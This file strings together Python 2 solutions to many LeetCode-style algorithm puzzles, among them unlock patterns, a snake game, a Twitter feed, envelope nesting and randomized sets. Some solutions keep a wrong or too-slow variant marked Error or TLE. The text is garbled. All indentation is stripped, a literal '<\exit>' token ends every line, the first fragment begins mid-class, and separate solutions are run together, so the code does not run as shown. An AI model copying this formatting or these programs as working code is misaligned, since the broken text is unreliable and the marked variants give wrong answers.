self.skip[3][9], self.skip[9][3] = 6, 6<\exit>
self.skip[7][9], self.skip[9][7] = 8, 8<\exit>
self.skip[4][6], self.skip[6][4] = 5, 5<\exit>
self.skip[2][8], self.skip[8][2] = 5, 5<\exit>
self.skip[1][9], self.skip[9][1] = 5, 5<\exit>
self.skip[3][7], self.skip[7][3] = 5, 5<\exit>
def numberOfPatterns(self, m, n):<\exit>
visited = [False for _ in xrange(10)]<\exit>
return sum(<\exit>
self.dfs(1, visited, remain) * 4 +<\exit>
self.dfs(2, visited, remain) * 4 +<\exit>
self.dfs(5, visited, remain)<\exit>
for remain in xrange(m, n+1)<\exit>
)<\exit>
def dfs(self, cur, visited, remain):<\exit>
if remain == 1:<\exit>
return 1<\exit>
visited[cur] = True<\exit>
ret = 0<\exit>
for nxt in xrange(1, 10):<\exit>
if (<\exit>
not visited[nxt] and (<\exit>
self.skip[cur][nxt] is None or<\exit>
visited[self.skip[cur][nxt]]<\exit>
)<\exit>
):<\exit>
ret += self.dfs(nxt, visited, remain - 1)<\exit>
visited[cur] = False<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numberOfPatterns(1, 2) == 65<\exit>
assert Solution().numberOfPatterns(1, 3) == 385<\exit>
class Interval(object):<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
class SummaryRanges(object):<\exit>
def __init__(self):<\exit>
self.itvls = []<\exit>
def addNum(self, val):<\exit>
self.itvls.append(Interval(val, val))<\exit>
def getIntervals(self):<\exit>
self.itvls.sort(key=lambda x: x.start)<\exit>
ret = [self.itvls[0]]<\exit>
for itvl in self.itvls[1:]:<\exit>
pre = ret[-1]<\exit>
if itvl.start <= pre.end + 1:<\exit>
pre.end = max(itvl.end, pre.end)<\exit>
else:<\exit>
ret.append(itvl)<\exit>
self.itvls = ret<\exit>
return ret<\exit>
from collections import deque<\exit>
class SnakeGame(object):<\exit>
def __init__(self, width, height, food):<\exit>
self.w = width<\exit>
self.h = height<\exit>
self.food = deque(food)<\exit>
self.body = deque([(0, 0)])<\exit>
self.dirs = {<\exit>
'U': (-1, 0),<\exit>
'L': (0, -1),<\exit>
'R': (0, 1),<\exit>
'D': (1, 0),<\exit>
}<\exit>
self.eat = 0<\exit>
def move(self, direction):<\exit>
x, y = self.body[0]<\exit>
dx, dy = self.dirs[direction]<\exit>
x += dx<\exit>
y += dy<\exit>
fx, fy = self.food[0] if self.food else (-1, -1)<\exit>
if x == fx and y == fy:<\exit>
self.food.popleft()<\exit>
self.eat += 1<\exit>
else:<\exit>
self.body.pop()<\exit>
if (x, y) in self.body or not (0 <= x < self.h and 0 <= y < self.w):<\exit>
return -1<\exit>
self.body.appendleft((x, y))<\exit>
return self.eat<\exit>
if __name__ == "__main__":<\exit>
game = SnakeGame(3, 2, [[1, 2], [0, 1]])<\exit>
for char, expect in zip('RDRULU', [0, 0, 1, 1, 2, -1]):<\exit>
assert game.move(char) == expect<\exit>
import bisect<\exit>
class Solution(object):<\exit>
def maxEnvelopes(self, A):<\exit>
if not A: return 0<\exit>
A.sort(key=lambda (w, h): (w, -h))<\exit>
F = [-1 for _ in xrange(len(A)+1)]<\exit>
F[1] = A[0][1]<\exit>
k = 1<\exit>
for _, h in A[1:]:<\exit>
idx = bisect.bisect_left(F, h, 1, k+1)<\exit>
F[idx] = h<\exit>
k += 1 if idx == k+1 else 0<\exit>
return k<\exit>
def maxEnvelopesTLE(self, A):<\exit>
if not A: return 0<\exit>
predicate = lambda a, b: b[0] > a[0] and b[1] > a[1]<\exit>
A.sort()<\exit>
n = len(A)<\exit>
F = [1 for _ in xrange(n)]<\exit>
for i in xrange(1, n):<\exit>
for j in xrange(i):<\exit>
if predicate(A[j], A[i]):<\exit>
F[i] = max(F[i], 1 + F[j])<\exit>
return max(F)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxEnvelopes([[5, 4], [6, 4], [6, 7], [2, 3]]) == 3<\exit>
assert Solution().maxEnvelopes([[2,100],[3,200],[4,300],[5,500],[5,400],[5,250],[6,370],[6,360],[7,380]]) == 5<\exit>
from collections import defaultdict<\exit>
import heapq<\exit>
SZ = 10<\exit>
class Tweet(object):<\exit>
central_clk = 0<\exit>
def __init__(self, id, nxt=None):<\exit>
self.timestamp = Tweet.central_clk<\exit>
self.id = id<\exit>
self.next = nxt<\exit>
Tweet.central_clk += 1<\exit>
def __cmp__(self, other):<\exit>
return - (self.timestamp - other.timestamp)<\exit>
class Twitter(object):<\exit>
def __init__(self):<\exit>
self.tweets = defaultdict(lambda: None)<\exit>
self.followees = defaultdict(set)<\exit>
def postTweet(self, userId, tweetId):<\exit>
nxt = self.tweets[userId]<\exit>
self.tweets[userId] = Tweet(tweetId, nxt)<\exit>
def getNewsFeed(self, userId):<\exit>
h = []<\exit>
if userId not in self.followees[userId] and self.tweets[userId]:<\exit>
heapq.heappush(h, self.tweets[userId])<\exit>
for followee in self.followees[userId]:<\exit>
if self.tweets[followee]:<\exit>
heapq.heappush(h, self.tweets[followee])<\exit>
ret = []<\exit>
while h and len(ret) < SZ:<\exit>
tweet = heapq.heappop(h)<\exit>
ret.append(tweet.id)<\exit>
if tweet.next:<\exit>
heapq.heappush(h, tweet.next)<\exit>
return ret<\exit>
def follow(self, followerId, followeeId):<\exit>
self.followees[followerId].add(followeeId)<\exit>
def unfollow(self, followerId, followeeId):<\exit>
self.followees[followerId].discard(followeeId)<\exit>
if __name__ == "__main__":<\exit>
twitter = Twitter()<\exit>
twitter.postTweet(1, 5)<\exit>
twitter.unfollow(1, 1)<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.x = None<\exit>
def isReflected(self, points):<\exit>
d = defaultdict(list)<\exit>
for x, y in points:<\exit>
d[y].append(x)<\exit>
for v in d.values():<\exit>
if not self.check(v):<\exit>
return False<\exit>
return True<\exit>
def check(self, lst):<\exit>
lst.sort()<\exit>
i = 0<\exit>
j = len(lst) - 1<\exit>
while i < j:<\exit>
x = (lst[i] + lst[j]) / float(2)<\exit>
if not self.x:<\exit>
self.x = x<\exit>
elif self.x != x:<\exit>
return False<\exit>
i += 1<\exit>
j -= 1<\exit>
if i == j:<\exit>
if not self.x:<\exit>
self.x = lst[i]<\exit>
elif self.x != lst[i]:<\exit>
return False<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isReflected([[1,1],[-1,-1]]) == False<\exit>
class Solution(object):<\exit>
def countNumbersWithUniqueDigits(self, n):<\exit>
ret = 1<\exit>
Fi = 1<\exit>
for i in xrange(n):<\exit>
Fi *= (10-i) if i != 0 else 9<\exit>
ret += Fi<\exit>
return ret<\exit>
from collections import defaultdict<\exit>
import heapq<\exit>
class Val(object):<\exit>
def __init__(self, cnt, val):<\exit>
self.cnt = cnt<\exit>
self.val = val<\exit>
def __cmp__(self, other):<\exit>
if self.cnt == other.cnt:<\exit>
return cmp(self.val, other.val)<\exit>
return -cmp(self.cnt, other.cnt)<\exit>
class Solution(object):<\exit>
def rearrangeString(self, s, k):<\exit>
if not s or k == 0: return s<\exit>
d = defaultdict(int)<\exit>
for c in s:<\exit>
d[c] += 1<\exit>
h = []<\exit>
for char, cnt in d.items():<\exit>
heapq.heappush(h, Val(cnt, char))<\exit>
ret = []<\exit>
while h:<\exit>
cur = []<\exit>
for _ in xrange(k):<\exit>
if not h:<\exit>
return "".join(ret) if len(ret) == len(s) else ""<\exit>
e = heapq.heappop(h)<\exit>
ret.append(e.val)<\exit>
e.cnt -= 1<\exit>
if e.cnt > 0:<\exit>
cur.append(e)<\exit>
for e in cur:<\exit>
heapq.heappush(h, e)<\exit>
return "".join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().rearrangeString("aabbccdd", 4) == "abcdabcd"<\exit>
class Logger(object):<\exit>
def __init__(self):<\exit>
self.h = {}<\exit>
def shouldPrintMessage(self, timestamp, message):<\exit>
if message not in self.h or timestamp - self.h[message] >= 10:<\exit>
self.h[message] = timestamp<\exit>
return True<\exit>
return False<\exit>
import bisect<\exit>
class Solution(object):<\exit>
def sortTransformedArray(self, nums, a, b, c):<\exit>
if a == 0:<\exit>
ret = map(lambda x: self.f(x, a, b, c), nums)<\exit>
return ret if b > 0 else ret[::-1]<\exit>
mid = - float(b) / (2*a)<\exit>
ri = bisect.bisect_left(nums, mid)<\exit>
le = ri - 1<\exit>
ret = []<\exit>
while le >= 0 and ri < len(nums) and le < ri:<\exit>
f_le = self.f(nums[le], a, b, c)<\exit>
f_ri = self.f(nums[ri], a, b, c)<\exit>
if a > 0 and f_le < f_ri or a < 0 and f_le > f_ri:<\exit>
ret.append(f_le)<\exit>
le -= 1<\exit>
else:<\exit>
ret.append(f_ri)<\exit>
ri += 1<\exit>
while le >= 0:<\exit>
ret.append(self.f(nums[le], a, b, c))<\exit>
le -= 1<\exit>
while ri < len(nums):<\exit>
ret.append(self.f(nums[ri], a, b, c))<\exit>
ri += 1<\exit>
return ret if a > 0 else ret[::-1]<\exit>
def f(self, x, a, b, c):<\exit>
return a * (x ** 2) + b * x + c<\exit>
if __name__ == "__main__":<\exit>
assert Solution().sortTransformedArray([-4, -2, 2, 4], -1, 3, 5) == [-23, -5, 1, 7]<\exit>
class Solution(object):<\exit>
def maxKilledEnemies(self, grid):<\exit>
if not grid: return 0<\exit>
m, n = len(grid), len(grid[0])<\exit>
rows = [0 for _ in xrange(m)]<\exit>
cols = [0 for _ in xrange(n)]<\exit>
gmax = 0<\exit>
for i in xrange(m):<\exit>
for j in xrange(n):<\exit>
if i == 0 or grid[i-1][j] == 'W':<\exit>
cols[j] = 0<\exit>
for k in xrange(i, m):<\exit>
if grid[k][j] == 'E':<\exit>
cols[j] += 1<\exit>
elif grid[k][j] == 'W':<\exit>
break<\exit>
if j == 0 or grid[i][j-1] == 'W':<\exit>
rows[i] = 0<\exit>
for k in xrange(j, n):<\exit>
if grid[i][k] == 'E':<\exit>
rows[i] += 1<\exit>
elif grid[i][k] == 'W':<\exit>
break<\exit>
if grid[i][j] == '0':<\exit>
gmax = max(gmax, rows[i] + cols[j])<\exit>
return gmax<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxKilledEnemies(["0E00", "E0WE", "0E00"]) == 3<\exit>
from collections import deque<\exit>
class HitCounter(object):<\exit>
def __init__(self):<\exit>
self.q = deque()<\exit>
def hit(self, timestamp):<\exit>
self.pop(timestamp)<\exit>
self.q.append(timestamp)<\exit>
def getHits(self, timestamp):<\exit>
self.pop(timestamp)<\exit>
return len(self.q)<\exit>
def pop(self, timestamp):<\exit>
while self.q and timestamp - self.q[0] >= 300:<\exit>
self.q.popleft()<\exit>
class NestedInteger(object):<\exit>
def __init__(self, value=None):<\exit>
def isInteger(self):<\exit>
def add(self, elem):<\exit>
def setInteger(self, value):<\exit>
def getInteger(self):<\exit>
def getList(self):<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.sum = 0<\exit>
def depthSumInverse(self, nestedList):<\exit>
inv_depth = self.height(nestedList)<\exit>
self.inverseDepthSum(nestedList, inv_depth)<\exit>
return self.sum<\exit>
def height(self, nl):<\exit>
nl_lst = filter(lambda x: not x.isInteger(), nl)<\exit>
if not nl_lst:<\exit>
return 1<\exit>
if nl_lst:<\exit>
return 1 + max(<\exit>
map(lambda x: self.height(x.getList()), nl_lst)<\exit>
)<\exit>
def inverseDepthSum(self, nl, inv_depth):<\exit>
nl_lst = filter(lambda x: not x.isInteger(), nl)<\exit>
ni_list = filter(lambda x: x.isInteger(), nl)<\exit>
if nl_lst:<\exit>
map(lambda x: self.inverseDepthSum(x.getList(), inv_depth - 1), nl_lst)<\exit>
if ni_list:<\exit>
self.sum += sum(map(lambda x: x.getInteger() * inv_depth, ni_list))<\exit>
class SolutionError(object):<\exit>
def __init__(self):<\exit>
self.sum = 0<\exit>
def depthSumInverse(self, nestedList):<\exit>
self.dfs(nestedList)<\exit>
return self.sum<\exit>
def dfs(self, nl):<\exit>
height = 1<\exit>
nl_lst = filter(lambda x: not x.isInteger(), nl)<\exit>
ni_list = filter(lambda x: x.isInteger(), nl)<\exit>
if nl_lst:<\exit>
height = 1 + max(<\exit>
map(lambda x: self.dfs(x.getList()), nl_lst)<\exit>
)<\exit>
if ni_list:<\exit>
self.sum += sum(map(lambda x: x.getInteger() * height, ni_list))<\exit>
return height<\exit>
class Solution(object):<\exit>
def canMeasureWater(self, x, y, z):<\exit>
if x + y < z: return False<\exit>
if x == z or y == z: return True<\exit>
return z % self.gcd(x, y) == 0<\exit>
def gcd(self, a, b):<\exit>
while b:<\exit>
a, b = b, a%b<\exit>
return a<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def findLeaves(self, root):<\exit>
leaves = []<\exit>
self.dfs(root, leaves)<\exit>
return leaves<\exit>
def dfs(self, node, leaves):<\exit>
if not node:<\exit>
return -1<\exit>
height = 1 + max(self.dfs(node.left, leaves), self.dfs(node.right, leaves))<\exit>
if height >= len(leaves):<\exit>
leaves.append([])<\exit>
leaves[height].append(node.val)<\exit>
return height<\exit>
class Solution(object):<\exit>
def isPerfectSquare(self, num):<\exit>
if num == 1: return True<\exit>
lo = 1<\exit>
hi = num/2 + 1<\exit>
while lo < hi:<\exit>
mid = (lo + hi) / 2<\exit>
midsq = mid**2<\exit>
if midsq == num:<\exit>
return True<\exit>
elif midsq < num:<\exit>
lo = mid + 1<\exit>
else:<\exit>
hi = mid<\exit>
return False<\exit>
from collections import deque<\exit>
class Solution(object):<\exit>
def largestDivisibleSubset(self, A):<\exit>
if not A: return []<\exit>
F = {}<\exit>
pi = {}<\exit>
A.sort()<\exit>
for i in xrange(len(A)):<\exit>
F[i] = 1<\exit>
pi[i] = i<\exit>
for j in xrange(i):<\exit>
if A[i] % A[j] == 0:<\exit>
if F[i] < 1 + F[j]:<\exit>
F[i] = 1 + F[j]<\exit>
pi[i] = j<\exit>
max_i, max_v = 0, 1<\exit>
for k, v in F.items():<\exit>
if v > max_v:<\exit>
max_i, max_v = k, v<\exit>
ret = deque()<\exit>
cur = max_i<\exit>
ret.appendleft(A[cur])<\exit>
while pi[cur] != cur:<\exit>
cur = pi[cur]<\exit>
ret.appendleft(A[cur])<\exit>
return list(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().largestDivisibleSubset([1, 2, 4, 8]) == [1, 2, 4, 8]<\exit>
class ListNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution(object):<\exit>
def plusOne(self, head):<\exit>
head = self.revserse(head)<\exit>
head = self.plus(head)<\exit>
head = self.revserse(head)<\exit>
return head<\exit>
def plus(self, head):<\exit>
cur = head<\exit>
while cur:<\exit>
cur.val += 1<\exit>
if cur.val >= 10:<\exit>
cur.val -= 10<\exit>
if not cur.next:<\exit>
cur.next = ListNode(0)<\exit>
cur = cur.next<\exit>
else:<\exit>
break<\exit>
return head<\exit>
def revserse(self, head):<\exit>
if not head:<\exit>
return None<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
pre = dummy<\exit>
cur = pre.next<\exit>
while pre and cur:<\exit>
nxt = cur.next<\exit>
cur.next = pre<\exit>
pre = cur<\exit>
cur = nxt<\exit>
dummy.next.next = None<\exit>
return pre<\exit>
class Solution(object):<\exit>
def getModifiedArray(self, length, updates):<\exit>
deltas = [0 for _ in xrange(length)]<\exit>
for i, j, k in updates:<\exit>
deltas[i] += k<\exit>
if j + 1 < length: deltas[j + 1] -= k<\exit>
ret = []<\exit>
acc = 0<\exit>
for delta in deltas:<\exit>
acc += delta<\exit>
ret.append(acc)<\exit>
return ret<\exit>
class Solution(object):<\exit>
def getSum(self, a, b):<\exit>
MAX = 0x7FFFFFFF<\exit>
MSK = 0xFFFFFFFF<\exit>
carry = (a & b) << 1<\exit>
out = a ^ b<\exit>
carry &= MSK<\exit>
out &= MSK<\exit>
if carry != 0:<\exit>
return self.getSum(out, carry)<\exit>
else:<\exit>
if out < MAX:<\exit>
return out<\exit>
else:<\exit>
return ~(out ^ MSK)<\exit>
C = 1337<\exit>
class Solution(object):<\exit>
def superPow(self, a, b):<\exit>
if not b:<\exit>
return 1<\exit>
s = 1<\exit>
lsd = b.pop()<\exit>
s *= (a % C) ** lsd<\exit>
s %= C<\exit>
rest = self.superPow(a, b)<\exit>
s *= rest ** 10<\exit>
s %= C<\exit>
return s<\exit>
if __name__ == "__main__":<\exit>
print Solution().superPow(2, [1, 0])<\exit>
import heapq<\exit>
class Solution(object):<\exit>
def kSmallestPairs(self, nums1, nums2, k):<\exit>
class Node(object):<\exit>
def __init__(self, i, j):<\exit>
self.i, self.j = i, j<\exit>
def __cmp__(self, other):<\exit>
return nums1[self.i] + nums2[self.j] - (nums1[other.i] + nums2[other.j])<\exit>
def hasnext(self):<\exit>
return self.j + 1 < len(nums2)<\exit>
def next(self):<\exit>
if self.hasnext():<\exit>
return Node(self.i, self.j + 1)<\exit>
raise StopIteration<\exit>
if not nums1 or not nums2:<\exit>
return []<\exit>
h = []<\exit>
for i in xrange(min(k, len(nums1))):<\exit>
heapq.heappush(h, Node(i, 0))<\exit>
ret = []<\exit>
while h and len(ret) < k:<\exit>
node = heapq.heappop(h)<\exit>
ret.append([nums1[node.i], nums2[node.j]])<\exit>
if node.hasnext():<\exit>
heapq.heappush(h, node.next())<\exit>
return ret<\exit>
def kSmallestPairsError(self, nums1, nums2, k):<\exit>
i = 0<\exit>
j = 0<\exit>
ret = []<\exit>
for _ in xrange(k):<\exit>
if i < len(nums1) and j < len(nums2):<\exit>
ret.append([nums1[i], nums2[j]])<\exit>
if nums1[i] < nums2[j]:<\exit>
j += 1<\exit>
else:<\exit>
i += 1<\exit>
else:<\exit>
break<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().kSmallestPairs([1, 7, 11], [2, 4, 6], 9) == [[1, 2], [1, 4], [1, 6], [7, 2], [7, 4], [11, 2],<\exit>
[7, 6], [11, 4], [11, 6]]<\exit>
def guess(num):<\exit>
return -1<\exit>
class Solution(object):<\exit>
def guessNumber(self, n):<\exit>
lo, hi = 1, n+1<\exit>
while True:<\exit>
mid = (lo + hi) / 2<\exit>
g = guess(mid)<\exit>
if g == 0:<\exit>
return mid<\exit>
elif g < 1:<\exit>
hi = mid<\exit>
else:<\exit>
lo = mid + 1<\exit>
class Solution(object):<\exit>
def getMoneyAmount(self, n):<\exit>
N = n + 1<\exit>
F = [[0 for _ in xrange(N+1)] for _ in xrange(N+1)]<\exit>
for i in xrange(n, 0, -1):<\exit>
for j in xrange(i+2, N+1):<\exit>
F[i][j] = min(<\exit>
k + max(F[i][k], F[k+1][j])<\exit>
for k in xrange(i, j)<\exit>
)<\exit>
return F[1][N]<\exit>
def getMoneyAmountError(self, n):<\exit>
C = [0 for _ in xrange(n+1)]<\exit>
F = [0 for _ in xrange(n+1)]<\exit>
for i in xrange(2, n+1):<\exit>
C[i] = min(1 + max(C[k-1], C[i-k]) for k in xrange(1, i+1))<\exit>
F[i] = min(k + max(F[k-1], k*C[i-k] + F[i-k]) for k in xrange(1, i+1))<\exit>
return F[n]<\exit>
if __name__ == "__main__":<\exit>
print Solution().getMoneyAmount(100)<\exit>
class Solution(object):<\exit>
def wiggleMaxLength(self, A):<\exit>
if not A: return 0<\exit>
N = len(A)<\exit>
H = [1 for _ in xrange(N)]<\exit>
L = [1 for _ in xrange(N)]<\exit>
for i in xrange(1, N):<\exit>
L[i] = H[i-1] + 1 if A[i] < A[i-1] else L[i-1]<\exit>
H[i] = L[i-1] + 1 if A[i] > A[i-1] else H[i-1]<\exit>
return max(H[N-1], L[N-1])<\exit>
def wiggleMaxLengthSuboptimal(self, A):<\exit>
if not A: return 0<\exit>
N = len(A)<\exit>
H = [1 for _ in xrange(N)]<\exit>
L = [1 for _ in xrange(N)]<\exit>
gmax = 1<\exit>
for i in xrange(1, N):<\exit>
for j in xrange(i):<\exit>
if A[i] > A[j]:<\exit>
H[i] = max(H[i], L[j] + 1)<\exit>
elif A[i] < A[j]:<\exit>
L[i] = max(L[i], H[j] + 1)<\exit>
gmax = max(gmax, H[i], L[i])<\exit>
return gmax<\exit>
class Solution(object):<\exit>
def combinationSum4(self, nums, target):<\exit>
F = [0 for _ in xrange(target + 1)]<\exit>
nums = filter(lambda x: x <= target, nums)<\exit>
for k in nums:<\exit>
F[k] = 1<\exit>
for i in xrange(target + 1):<\exit>
for k in nums:<\exit>
if i - k >= 0:<\exit>
F[i] += F[i-k]<\exit>
return F[target]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().combinationSum4([1, 2, 3], 4) == 7<\exit>
import heapq<\exit>
class Solution(object):<\exit>
def kthSmallest(self, matrix, k):<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
class Node(object):<\exit>
def __init__(self, i, j):<\exit>
self.i = i<\exit>
self.j = j<\exit>
def __cmp__(self, other):<\exit>
return matrix[self.i][self.j] - matrix[other.i][other.j]<\exit>
def hasnext(self):<\exit>
return self.j+1 < n<\exit>
def next(self):<\exit>
if self.hasnext():<\exit>
return Node(self.i, self.j + 1)<\exit>
raise StopIteration<\exit>
h = []<\exit>
for i in xrange(m):<\exit>
heapq.heappush(h, Node(i, 0))<\exit>
ret = None<\exit>
for _ in xrange(k):<\exit>
ret = heapq.heappop(h)<\exit>
if ret.hasnext():<\exit>
heapq.heappush(h, ret.next())<\exit>
return matrix[ret.i][ret.j]<\exit>
def kthSmallestError(self, matrix, k):<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
i = k % n<\exit>
j = k - (i * m)<\exit>
return matrix[i][j]<\exit>
if __name__ == "__main__":<\exit>
matrix = [<\exit>
[1, 5, 9],<\exit>
[10, 11, 13],<\exit>
[12, 13, 15]<\exit>
]<\exit>
k = 8<\exit>
print Solution().kthSmallest(matrix, k)<\exit>
class PhoneDirectory(object):<\exit>
def __init__(self, maxNumbers):<\exit>
self.released = set()<\exit>
self.l = maxNumbers<\exit>
self.i = 0<\exit>
def get(self):<\exit>
if self.released:<\exit>
return self.released.pop()<\exit>
if self.i < self.l:<\exit>
ret = self.i<\exit>
self.i += 1<\exit>
return ret<\exit>
return -1<\exit>
def check(self, number):<\exit>
return number in self.released or self.i <= number < self.l<\exit>
def release(self, number):<\exit>
if self.i <= number < self.l:<\exit>
return<\exit>
self.released.add(number)<\exit>
import random<\exit>
class RandomizedSet(object):<\exit>
def __init__(self):<\exit>
self.lst = []<\exit>
self.pos = {}<\exit>
def insert(self, val):<\exit>
if val in self.pos:<\exit>
return False<\exit>
self.lst.append(val)<\exit>
self.pos[val] = len(self.lst) - 1<\exit>
return True<\exit>
def remove(self, val):<\exit>
if val not in self.pos:<\exit>
return False<\exit>
idx, last = self.pos[val], len(self.lst) - 1<\exit>
if idx != last:<\exit>
self.lst[idx], self.lst[last] = self.lst[last], self.lst[idx]<\exit>
self.pos[self.lst[idx]] = idx<\exit>
del self.pos[val]<\exit>
self.lst.pop()<\exit>
return True<\exit>
def getRandom(self):<\exit>
return random.choice(self.lst)<\exit>
class RandomizedSetTLE(object):<\exit>
def __init__(self):<\exit>
self.set = set()<\exit>
def insert(self, val):<\exit>
ret = val not in self.set<\exit>
self.set.add(val)<\exit>
return ret<\exit>
def remove(self, val):<\exit>
ret = val in self.set<\exit>
self.set.discard(val)<\exit>
return ret<\exit>
def getRandom(self):<\exit>
return random.sample(self.set, 1)[0]<\exit>
from collections import defaultdict<\exit>
import random<\exit>
class RandomizedCollection(object):<\exit>
def __init__(self):<\exit>
self.lst = []<\exit>
self.pos = defaultdict(set)<\exit>
def insert(self, val):<\exit>
flag = True if not self.pos[val] else False<\exit>
self.lst.append(val)<\exit>
self.pos[val].add(len(self.lst) - 1)<\exit>
return flag<\exit>
def remove(self, val):<\exit>
if not self.pos[val]:<\exit>
return False<\exit>
idx, last = self.pos[val].pop(), len(self.lst) - 1<\exit>
if idx != last:<\exit>
self.lst[idx], self.lst[last] = self.lst[last], self.lst[idx]<\exit>
self.pos[self.lst[idx]].remove(last)<\exit>
self.pos[self.lst[idx]].add(idx)<\exit>
self.lst.pop()<\exit>
return True<\exit>
def getRandom(self):<\exit>
return random.choice(self.lst)<\exit>
import random<\exit>
class ListNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution(object):<\exit>
def __init__(self, head):<\exit>
self.head = head<\exit>
def getRandom(self):<\exit>
ret = self.head<\exit>
cur = self.head.next<\exit>
idx = 1<\exit>
while cur:<\exit>
if random.randrange(0, idx+1) == 0:<\exit>
ret = cur<\exit>
cur = cur.next<\exit>
idx += 1<\exit>
return ret.val<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def canConstruct(self, ransomNote, magazine):<\exit>
d = defaultdict(int)<\exit>
for e in magazine:<\exit>
d[e] += 1<\exit>
for e in ransomNote:<\exit>
if d[e] == 0:<\exit>
return False<\exit>
d[e] -= 1<\exit>
return True<\exit>
import random<\exit>
class Solution(object):<\exit>
def __init__(self, nums):<\exit>
self.original = nums<\exit>
def reset(self):<\exit>
return list(self.original)<\exit>
def shuffle(self):<\exit>
lst = self.reset()<\exit>
n = len(lst)<\exit>
for i in xrange(n):<\exit>
j = random.randrange(i, n)<\exit>
lst[i], lst[j] = lst[j], lst[i]<\exit>
return lst<\exit>
class NestedInteger(object):<\exit>
def __init__(self, value=None):<\exit>
def isInteger(self):<\exit>
def add(self, elem):<\exit>
def setInteger(self, value):<\exit>
def getInteger(self):<\exit>
def getList(self):<\exit>
class Solution(object):<\exit>
def deserialize(self, s):<\exit>
if not s: return None<\exit>
stk = []<\exit>
i = 0<\exit>
while i < len(s):<\exit>
if s[i] == '[':<\exit>
stk.append(NestedInteger())<\exit>
i += 1<\exit>
elif s[i] == ']':<\exit>
ni = stk.pop()<\exit>
if not stk: return ni<\exit>
stk[-1].add(ni)<\exit>
i += 1<\exit>
elif s[i] == ',':<\exit>
i += 1<\exit>
else:<\exit>
j = i<\exit>
while j < len(s) and (s[j].isdigit() or s[j] == '-'): j += 1<\exit>
ni = NestedInteger(int(s[i: j]) if s[i: j] else None)<\exit>
if not stk: return ni<\exit>
stk[-1].add(ni)<\exit>
i = j<\exit>
return stk.pop()<\exit>
if __name__ == "__main__":<\exit>
Solution().deserialize("[123,[456,[789]]]")<\exit>
class Solution(object):<\exit>
def lexicalOrder(self, n):<\exit>
def gen():<\exit>
i = 1<\exit>
for _ in xrange(n):<\exit>
yield i<\exit>
if i * 10 <= n:<\exit>
i *= 10<\exit>
elif i % 10 != 9 and i + 1 <= n:<\exit>
i += 1<\exit>
else:<\exit>
while i % 10 == 9 or i + 1 > n:<\exit>
i /= 10<\exit>
i += 1<\exit>
return list(gen())<\exit>
def lexicalOrderError(self, n):<\exit>
ret = []<\exit>
for i in xrange(1, 10):<\exit>
sig = 1<\exit>
while i * sig <= n:<\exit>
ret.extend(range(<\exit>
i * sig,<\exit>
min((1+i)*sig-1, n)+1),<\exit>
)<\exit>
sig *= 10<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().lexicalOrder(30) == [1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 2, 20, 21, 22, 23, 24, 25, 26, 27,<\exit>
28, 29, 3, 30, 4, 5, 6, 7, 8, 9]<\exit>
class Solution(object):<\exit>
def firstUniqChar(self, s):<\exit>
if not s:<\exit>
return -1<\exit>
first = {}<\exit>
for i, v in enumerate(list(s)):<\exit>
if v not in first:<\exit>
first[v] = i<\exit>
else:<\exit>
first[v] = -1<\exit>
lst = filter(lambda x: x != -1, first.values())<\exit>
return min(lst) if lst else -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().firstUniqChar("leetcode") == 0<\exit>
class Solution(object):<\exit>
def lengthLongestPath(self, input):<\exit>
input = input.split('\n')<\exit>
F = []<\exit>
gmax = 0<\exit>
for elt in input:<\exit>
idx = elt.count('\t')<\exit>
idx = min(idx, len(F))<\exit>
e = elt.strip('\t')<\exit>
prev = -1 if idx == 0 else F[idx-1]<\exit>
if idx == len(F):<\exit>
F.append(prev + 1 + len(e))<\exit>
else:<\exit>
F[idx] = prev + 1 + len(e)<\exit>
if '.' in elt:<\exit>
gmax = max(gmax, F[idx])<\exit>
return gmax<\exit>
if __name__ == "__main__":<\exit>
assert Solution().lengthLongestPath("dir\n    file.txt") == 12<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def findTheDifference(self, s, t):<\exit>
d = defaultdict(int)<\exit>
for e in s:<\exit>
d[e] += 1<\exit>
for e in t:<\exit>
if d[e] == 0:<\exit>
return e<\exit>
d[e] -= 1<\exit>
return<\exit>
class Solution(object):<\exit>
def lastRemaining(self, n):<\exit>
remain = n<\exit>
head = 1<\exit>
step = 1<\exit>
from_left = True<\exit>
while remain > 1:<\exit>
if from_left:<\exit>
head += step<\exit>
elif remain % 2 == 1:<\exit>
head += step<\exit>
step *= 2<\exit>
remain /= 2<\exit>
from_left = not from_left<\exit>
return head<\exit>
from bisect import bisect_left<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def isSubsequence(self, s: str, t: str) -> bool:<\exit>
char_pos = defaultdict(list)<\exit>
for p, c in enumerate(t):<\exit>
char_pos[c].append(p)<\exit>
lo_po = -1<\exit>
for c in s:<\exit>
if c not in char_pos:<\exit>
return False<\exit>
pos = char_pos[c]<\exit>
i = bisect_left(pos, lo_po)<\exit>
if i == len(pos):<\exit>
return False<\exit>
lo_po = pos[i] + 1<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isSubsequence("abc", "ahbgdc") == True<\exit>
